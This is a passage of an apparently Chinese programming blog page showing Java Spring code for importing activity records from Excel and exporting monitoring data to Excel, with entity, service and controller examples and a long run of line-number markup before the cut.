class="meta">@Column(name = &quot;XING_Activity_name&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动名称&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动名称&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String activityName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 信易行活动举办单位</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Table:     XYGL_XING_Activity</span></span><br><span class="line"><span class="comment">     * Column:    XING_Activity_host</span></span><br><span class="line"><span class="comment">     * Nullable:  true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;XING_Activity_host&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动举办单位&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动举办单位&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String activityHost;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 信易行活动开始时间</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Table:     XYGL_XING_Activity</span></span><br><span class="line"><span class="comment">     * Column:    XING_Activity_start_time</span></span><br><span class="line"><span class="comment">     * Nullable:  true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;XING_Activity_start_time&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动开始时间&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动开始时间&quot;)</span></span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd&quot;,timezone = &quot;GMT+8&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date activityStartTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 信易行活动结束时间</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Table:     XYGL_XING_Activity</span></span><br><span class="line"><span class="comment">     * Column:    XING_Activity_end_time</span></span><br><span class="line"><span class="comment">     * Nullable:  true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;XING_Activity_end_time&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动结束时间&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动结束时间&quot;)</span></span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd&quot;,timezone = &quot;GMT+8&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date activityEndTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 信易行活动描述</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Table:     XYGL_XING_Activity</span></span><br><span class="line"><span class="comment">     * Column:    XING_Activity_describe</span></span><br><span class="line"><span class="comment">     * Nullable:  true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;XING_Activity_describe&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动描述&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动描述&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String activityDescribe;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 信易行活动状态(0:启用，1:禁用)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Table:     XYGL_XING_Activity</span></span><br><span class="line"><span class="comment">     * Column:    XING_Activity_state</span></span><br><span class="line"><span class="comment">     * Nullable:  true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;XING_Activity_state&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动状态(0:启用，1:禁用)&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;活动状态(0:启用，1:禁用)&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String activityState;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Service类-3"><a href="#Service类-3" class="headerlink" title="Service类"></a>Service类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">importActivity</span><span class="params">(List&lt;ImportActivityReq&gt; activityList, Integer userId, String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (com.psds.credit.common.utils.StringUtils.isNull(activityList) || activityList.size() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(<span class="string">&quot;导入活动信息不能为空！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> successNum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> failureNum = <span class="number">0</span>;</span><br><span class="line">        StringBuilder successMsg = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        StringBuilder failureMsg = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (ImportActivityReq activity : activityList) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                XINGActivity xingActivity = <span class="keyword">new</span> XINGActivity();</span><br><span class="line">                xingActivity.setXingActivityName(activity.getActivityName());</span><br><span class="line">                xingActivity.setXingActivityHost(activity.getActivityHost());</span><br><span class="line">                xingActivity.setXingActivityState(activity.getActivityState());</span><br><span class="line">                xingActivity.setXingActivityStartTime(activity.getActivityStartTime());</span><br><span class="line">                xingActivity.setXingActivityEndTime(activity.getActivityEndTime());</span><br><span class="line">                xingActivity.setXingActivityDescribe(activity.getActivityDescribe());</span><br><span class="line">                xingActivity.setDelFlag(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">                xingActivity.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">                xingActivity.setCreateUserId(userId);</span><br><span class="line">                xingActivity.setCreateUserName(username);</span><br><span class="line">                xingActivityMapper.insertSelective(xingActivity);</span><br><span class="line">                successNum++;</span><br><span class="line">                successMsg.append(<span class="string">&quot;&lt;br/&gt;&quot;</span> + successNum + <span class="string">&quot;、活动信息 &quot;</span> + activity.getActivityName() + <span class="string">&quot; 导入成功&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                failureNum++;</span><br><span class="line">                String msg = <span class="string">&quot;&lt;br/&gt;&quot;</span> + failureNum + <span class="string">&quot;、活动信息 &quot;</span> + activity.getActivityName() + <span class="string">&quot; 导入失败：&quot;</span>;</span><br><span class="line">                failureMsg.append(msg + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (failureNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            failureMsg.insert(<span class="number">0</span>, <span class="string">&quot;很抱歉，导入失败！共 &quot;</span> + failureNum + <span class="string">&quot; 条数据格式不正确，错误如下：&quot;</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(failureMsg.toString());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            successMsg.insert(<span class="number">0</span>, <span class="string">&quot;恭喜您，数据已全部导入成功！共 &quot;</span> + successNum + <span class="string">&quot; 条，数据如下：&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> successMsg.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Controller类-2"><a href="#Controller类-2" class="headerlink" title="Controller类"></a>Controller类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;导入活动信息&quot;,notes = &quot;&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/importExcel&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ResultData <span class="title">importActivity</span><span class="params">(<span class="meta">@RequestPart(&quot;file&quot;)</span> MultipartFile file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    ExcelUtil&lt;ImportActivityReq&gt; util = <span class="keyword">new</span> ExcelUtil&lt;ImportActivityReq&gt;(ImportActivityReq.class);</span><br><span class="line">    List&lt;ImportActivityReq&gt; activityList = util.importExcel(file.getInputStream());</span><br><span class="line">    String message = xingActivityService.importActivity(activityList,Math.toIntExact(getUserId()),getUsername());</span><br><span class="line">    ResultData resultData = <span class="keyword">new</span> ResultData&lt;&gt;();</span><br><span class="line">    resultData.setMsg(message);</span><br><span class="line">    <span class="keyword">return</span> resultData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(&quot;重点人员健康检测-导出数据&quot;)</span></span><br><span class="line">   <span class="meta">@PostMapping(&quot;export&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">export</span><span class="params">(<span class="meta">@RequestBody</span> MonitorPersonListVo monitorPersonListVo,</span></span></span><br><span class="line"><span class="function"><span class="params">                            HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       LoginUser loginUser = tokenService.getLoginUser(request);</span><br><span class="line">       monitorPersonListVo.setDeptId(loginUser.getDeptId());</span><br><span class="line">       List&lt;MonitorPersonExportVo&gt; list = monitorPersonService.selectExportList(monitorPersonListVo);</span><br><span class="line">       ExcelUtil&lt;MonitorPersonExportVo&gt; util = <span class="keyword">new</span> ExcelUtil&lt;MonitorPersonExportVo&gt;(MonitorPersonExportVo.class);</span><br><span class="line">       util.exportExcel(response,list, <span class="string">&quot;重点人员健康检测数据&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="ExcelExportUtil"><a href="#ExcelExportUtil" class="headerlink" title="ExcelExportUtil"></a>ExcelExportUtil</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span 